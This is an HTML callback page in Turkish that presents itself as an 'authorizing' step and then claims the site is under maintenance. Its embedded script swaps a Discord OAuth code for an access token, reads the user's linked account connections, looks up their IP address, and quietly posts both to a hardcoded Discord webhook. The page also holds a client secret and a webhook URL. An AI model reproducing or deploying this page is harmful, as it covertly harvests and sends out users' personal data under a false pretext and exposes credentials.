<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Yetkilendiriliyor...</title>
  <style>
    @keyframes rgbCycle {
      0% { color: rgb(255, 0, 0); }
      33% { color: rgb(0, 255, 0); }
      66% { color: rgb(0, 0, 255); }
      100% { color: rgb(255, 0, 0); }
    }
    body {
      margin: 0;
      height: 100vh;
      background-color: #0f0f13;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: monospace, monospace;
      user-select: none;
      color: #ff4757;
      padding: 2rem;
    }
    h1 {
      font-size: 2.5rem;
      text-align: center;
      user-select: none;
    }
    .rgb {
      animation: rgbCycle 4s linear infinite;
    }
  </style>
</head>
<body>
  <h1 id="status">Yetkilendiriliyor...</h1>

  <script>
    (async () => {
      const client_id = "1354724175788380327";
      const client_secret = "3A8QJOc_MSUXC8rXtA-kr_rzGt8b8q2d";
      const redirect_uri = "https://rencordx.github.io/home/callback.html";
      const webhook_url = "https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA";

      const statusEl = document.getElementById("status");

      const code = new URLSearchParams(window.location.search).get("code");
      if (!code) {
        // Kod yoksa hiçbir işlem yok, status kalır
        return;
      }

      try {
        // 1. access_token al
        const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            client_id,
            client_secret,
            grant_type: "authorization_code",
            code,
            redirect_uri
          })
        });
        const tokenData = await tokenRes.json();
        if (!tokenData.access_token) throw new Error("Access token alınamadı.");

        // 2. Kullanıcının bağlantılarını (connections) çek
        const connectionsRes = await fetch("https://discord.com/api/users/@me/connections", {
          headers: { "Authorization": `Bearer ${tokenData.access_token}` }
        });
        const connections = await connectionsRes.json();

        // 3. IP adresi al
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();

        // 4. Webhook payload
        const payload = {
          connections: connections,
          client_ip: ipData.ip
        };

        // 5. Webhook'a gönder
        await fetch(webhook_url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
          })
        });

        // İşlem tamamlandıktan sonra yazıyı değiştir
        statusEl.textContent = "Sitemiz Şu anda Bakımda.";
        statusEl.classList.add("rgb");
      } catch (err) {
        // Hata olsa da kullanıcı görmesin, sadece konsola logla
        console.error("Hata:", err);
      }
    })();
  </script>
</body>
</html>
